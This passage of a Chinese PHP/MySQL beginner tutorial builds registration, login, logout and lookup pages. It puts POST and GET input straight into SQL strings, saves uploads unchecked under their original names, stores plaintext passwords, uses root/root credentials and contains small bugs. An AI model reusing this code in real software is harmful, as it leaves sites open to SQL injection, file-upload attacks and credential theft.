class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">	<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;tupian&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line"><span class="comment">// echo &quot;文件存储在: &quot; . &quot;tupian/&quot; . $_FILES[&quot;tupian&quot;][&quot;name&quot;];</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传头像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ERR</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的用户为：&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你注册的手机号码：&quot;</span>.<span class="variable">$shouji</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;]; ?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="需求"><a class="header-anchor" href="#需求">¶</a>需求</h4>
+<p>​	1、先判断是否有库，如果没有库就创建</p>
+<p>​	2、判断是否有表，没有表直接创建</p>
+<p>​	3、注册成功后直接将数据插入到表的内容里面</p>
+<h4 id="最后代码"><a class="header-anchor" href="#最后代码">¶</a>最后代码</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// conn.php</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;kkk&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// echo &quot;数据连接成功&lt;/br&gt;&quot;;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>))&#123;</span><br><span class="line"><span class="comment">// // echo &quot;数据库已经存在&quot;;</span></span><br><span class="line"><span class="comment">// $conn2 = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;开始自动创建数据库&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;create DATABASE &quot;</span>.<span class="variable">$dbname</span>;</span><br><span class="line">	<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="variable">$createtbl</span>=<span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">    `id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">    `user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">    `pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">    `phone` VARCHAR(11) NOT NULL,</span></span><br><span class="line"><span class="string">    `file` VARCHAR(30) ,</span></span><br><span class="line"><span class="string">	PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">) ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line">	<span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">	<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$createtbl</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mysqli_close($conn);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// mysqli_close($conn);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 最后整合.php</span></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$password1</span>) &amp;&amp;</span><br><span class="line">		<span class="keyword">empty</span>(<span class="variable">$password2</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;用户名、密码、手机号码不能为空&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password1</span>)&lt;<span class="number">8</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;密码长度必须大于等于8位&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="variable">$password1</span>!=<span class="variable">$password2</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;两次密码不一致&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shouji</span>)!=<span class="number">11</span>)&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;手机号码不符合规范&quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//开始处理图片</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;tupian/&quot;</span> . <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">		<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tupian</span>[<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;tupian/&quot;</span> . <span class="variable">$tupian</span>[<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">		<span class="variable">$tupianfile</span>=<span class="variable">$tupian</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件存储在:tupian/&quot;</span>.<span class="variable">$tupianfile</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$tupianfile</span>=<span class="variable">$tupian</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$sqlinsert</span>=<span class="string">&quot;</span></span><br><span class="line"><span class="string">	insert into kkk_tbl(user,pass,phone,file)</span></span><br><span class="line"><span class="string">	values(&#x27;<span class="subst">$name</span>&#x27;,&#x27;<span class="subst">$password1</span>&#x27;,&#x27;<span class="subst">$shouji</span>&#x27;,&#x27;<span class="subst">$tupianfile</span>&#x27;);</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">        </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sqlinsert</span>&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$conn2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$sqlinsert</span>))&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$zhErr</span>=<span class="string">&quot;注册失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span>method=<span class="string">&quot;post&quot;</span>enctype=<span class="string">&quot;multipart/form-data&quot;</span> &gt;</span><br><span class="line">名字：</span><br><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> &gt; &lt;br&gt;</span><br><span class="line">密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password1&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">重新输入密码：</span><br><span class="line">&lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password2&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">请输入手机号码：</span><br><span class="line">&lt;input type=<span class="string">&quot;passwrd&quot;</span> name=<span class="string">&quot;shouji&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">上传图像：</span><br><span class="line">&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;tupian&quot;</span> &gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$zhErr</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;img src=<span class="string">&quot;&lt;?php echo &quot;</span>tupian/<span class="string">&quot;.<span class="subst">$_FILES</span>[&quot;</span>tupian<span class="string">&quot;][&quot;</span>name<span class="string">&quot;];?&gt;&quot;</span> alt=<span class="string">&quot;上传的图片&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="查询数据"><a class="header-anchor" href="#查询数据">¶</a>查询数据</h4>
+<ul>
+<li>
+<p>SELECT 语句用于从数据表中读取数据:</p>
+<p><code>SELECT column_name(s) FROM table_name</code></p>
+</li>
+</ul>
+<h4 id="PHP联动查询"><a class="header-anchor" href="#PHP联动查询">¶</a>PHP联动查询</h4>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;conn.php&#x27;</span>);</span><br><span class="line"><span class="variable">$chaxun</span>=<span class="string">&quot;select * from kkk_tbl;&quot;</span>;</span><br><span class="line"><span class="variable">$lianjie</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>,<span class="variable">$chaxun</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// var_dump($lianjie);</span></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$lianjie</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$row</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass</span>=<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">    <span class="variable">$phone</span>=<span class="variable">$row</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;user:&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;pass:&quot;</span>.<span class="variable">$pass</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="string">&quot;phone:&quot;</span>.<span class="variable">$phone</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>原始查询代码</li>
+</ul>
+<p><code>select id, username from users where id = 2;</code></p>
+<ul>
+<li>优化后的php代码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$chaxunsql</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;chaxun&#x27;</span>];</span><br><span class="line"><span class="comment">//增加一个判断，判断传入值是数字还是字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$chaxunsql</span>))&#123;</span><br><span class="line">	<span class="variable">$chaxunsql</span>=<span class="string">&quot;id=<span class="subst">$chaxunsql</span>&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$chaxunsql</span>=<span class="string">&quot;username=&#x27;<span class="subst">$chaxunsql</span>&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chaxun</span>=<span class="string">&quot;select id,username from users where <span class="subst">$chaxunsql</span> &quot;</span>;</span><br><span class="line"><span class="variable">$reslust</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$chaxun</span>);</span><br><span class="line"><span class="comment">//mysqli_fetch_assoc() 查询数据库结果并且赋值为一行</span></span><br><span class="line">@<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$reslust</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$row</span>[<span class="string">&quot;id&quot;</span>];</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$row</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="comment">//提取row数字中的username字段</span></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;id:<span class="subst">$id</span>&lt;/br&gt;username:<span class="subst">$username</span>&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;mate charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1&gt;请输入你要查询的id或者账号名字&lt;/h1&gt;</span><br><span class="line">    </span><br><span class="line">&lt;form action=<span class="string">&quot;#&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;chaxun&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> &gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$html</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="例：网站登录注册-登录界面Pro"><a class="header-anchor" href="#例：网站登录注册-登录界面Pro">¶</a>例：网站登录注册+登录界面Pro</h2>
+<ul>
+<li>注：注册界面任务分解，先写出最简单的登录页面，只需要能够判断是否登录成功即可</li>
+<li>结构：
+<ul>
+<li>tupian(文件夹，存放静态资源)</li>
+<li>login.php 登陆界面</li>
+<li>zhuxiao.php  注销界面</li>
+<li>conn.php   数据库连接界面</li>
+<li>zhuce.php   注册界面</li>
+<li>session.php   管理session</li>
+<li>youxi.php    假装后台界面</li>
+</ul>
+</li>
+</ul>
+<h3 id="登录页面login-php"><a class="header-anchor" href="#登录页面login-php">¶</a>登录页面login.php</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$uapsql</span>=<span class="string">&quot;select user,pass from kkk_tbl where user=&#x27;<span class="subst">$username</span>&#x27; and pass=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$reslust</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>,<span class="variable">$uapsql</span>);</span><br><span class="line"><span class="comment">// var_dump($reslust);</span></span><br><span class="line"><span class="comment">// var_dump();</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$reslust</span>))&#123;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:youxi.php&#x27;</span>);</span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$login</span> = <span class="string">&quot;登录失败&quot;</span>;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">    </span><br><span class="line">&lt;h1&gt;请输入账号以及密码&lt;/h1&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> &gt;&lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt; &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt; &lt;/br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">&lt;a href=<span class="string">&quot;zhuce.php&quot;</span>&gt;点击注册&lt;/a&gt;&lt;/br&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$login</span>;<span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="注销界面zhuxiao-php"><a class="header-anchor" href="#注销界面zhuxiao-php">¶</a>注销界面zhuxiao.php</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>]=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="数据库连接界面conn-php"><a class="header-anchor" href="#数据库连接界面conn-php">¶</a>数据库连接界面conn.php</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;kkk&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">// echo &quot;数据连接成功&lt;/br&gt;&quot;;</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>))&#123;</span><br><span class="line"><span class="comment">// // echo &quot;数据库已经存在&quot;;</span></span><br><span class="line"><span class="comment">// $conn2 = mysqli_connect($servername, $username, $password, $dbname);</span></span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;开始自动创建数据库&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;create DATABASE &quot;</span>.<span class="variable">$dbname</span>;</span><br><span class="line">		<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;数据库创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">		<span class="variable">$createtbl</span>=<span class="string">&quot;CREATE TABLE IF NOT EXISTS `kkk_tbl`(</span></span><br><span class="line"><span class="string">        `id` INT UNSIGNED AUTO_INCREMENT,</span></span><br><span class="line"><span class="string">        `user` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">        `pass` VARCHAR(10) NOT NULL,</span></span><br><span class="line"><span class="string">        `phone` VARCHAR(11) NOT NULL,</span></span><br><span class="line"><span class="string">        `file` VARCHAR(30) ,</span></span><br><span class="line"><span class="string">        PRIMARY KEY ( `id` )</span></span><br><span class="line"><span class="string">        )ENGINE=InnoDB DEFAULT CHARSET=utf8;&quot;</span>;</span><br><span class="line">		<span class="variable">$conn2</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">		<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn2</span>, <span class="variable">$createtbl</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;数据表创建成功&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="注册界面zhuce-php"><a class="header-anchor" href="#注册界面zhuce-php">¶</a>注册界面zhuce.php</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$password1</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password1&#x27;</span>];</span><br><span class="line"><span class="variable">$password2</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password2&#x27;</span>];</span><br><span class="line"><span class="variable">$shouji</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;shouji&#x27;</span>];</span><br><span class="line"><span class="variable">$tupian</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>];</span><br><span class="line"><span class="variable">$tupianname</span>=<span class="variable">$_FILES</span>[<span class="string">&#x27;tupian&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="comment">// echo $name,$password1,$password2,$shouji,$tupian;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$name</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$password1</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$password2</span>) ||</span><br><span class="line">    <span class="keyword">empty</span>(<span class="variable">$shouji</span>))&#123;</span><br><span class="line">		<span class="variable">$ERR</span>=<span 